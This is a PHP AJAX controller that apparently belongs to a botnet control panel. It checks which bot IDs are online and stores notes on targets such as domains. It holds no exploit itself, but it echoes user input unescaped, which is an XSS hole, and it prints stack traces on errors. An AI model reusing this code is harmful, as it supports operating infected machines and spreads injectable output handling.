<?php
require 'system/lib/dbpdo.php';
require 'system/lib/GlobalNotes.php';

class AjaxController {
    function __construct(){
        $this->db = dbPDO::singleton();
    }

    function actionSupermenu_onlineBots($botIds = ''){
        echo '<h1>Online Bots Checker</h1>';

        if (!empty($botIds)){
            require_once "system/api.php";
            $apiBots = new BotsController();
            $onliners = $apiBots->actionOnline(array_filter(array_map('trim', explode("\n", $botIds)), 'strlen'));

            echo '<table>';
            foreach ($onliners as $botId => $state){
                echo '<tr>';
                echo '<td>', '<img src="theme/images/icons/', $state? 'on' : 'off', 'line.png" /> ', '</td>';
                echo '<td> ', $botId, '</td>';
                echo '</tr>';
            }
            echo '</table>';
        }

        echo '<form id="supermenu-onlinebots" method="POST" action="?m=ajax/supermenu_onlinebots">',
                '<textarea name="botIds" rows="10" cols="60">', $botIds, '</textarea>',
                '<br><input type="submit" value="Check" />',
                '</form>';
    }

    /** Notes AJAX API on notes attached to entities with arbitrary identifiers
     * @param string $action
     *      'get'       Read a note by ($type,$id)
     *                  {{ ok: Boolean, note: (String|Boolean)?, error: String? }}
     *      'set'       Store a note $note into ($type,$id)
     *                  {{ ok: Boolean, error: String? }}
     *      'del'       Delete a note from ($type,$id)
     *                  {{ ok: Boolean, error: String? }}
     * @param string $type
     *      The note type
     * @param string $id
     *      The note identifier
     * @param string? $note
     *      The note text
     * @param mixed $preproc
     *      When positive, the $id preprocessing occurs
     */
    function actionNote($action, $type, $id, $note = null, $preproc = null){
        # Preprocess
        if ($preproc)
            switch ($type){
                case 'domain':
                    $id = GlobalNotes::idUrl($id);
                    break;
            }

        # Action!
        $response = array('ok' => true, 'error' => null);
        $notes = GlobalNotes::singleton();
        try {
            switch ($action){
                case 'get':
                    $response['note'] = $notes->get($type, $id);
                    break;
                case 'set':
                    $note = trim($note);
                    if (strlen($note) > 0 && $note != '<br>'){
                        $response['ok'] = $notes->set($type, $id, $note);
                        break;
                    }
                    # else proceed to del()
                case 'del':
                    $response['ok'] = $notes->del($type, $id);
                    break;
                default:
                    $response['ok'] = false;
                    $response['error'] = 'unknown action: '.$action;
            }
        } catch (Exception $e){
            $response['ok'] = false;
            $response['error'] = $e . $e->getMessage();
            die($e->getTraceAsString());
        }

        header('Content-Type: application/json');
        echo json_encode($response);
    }
}
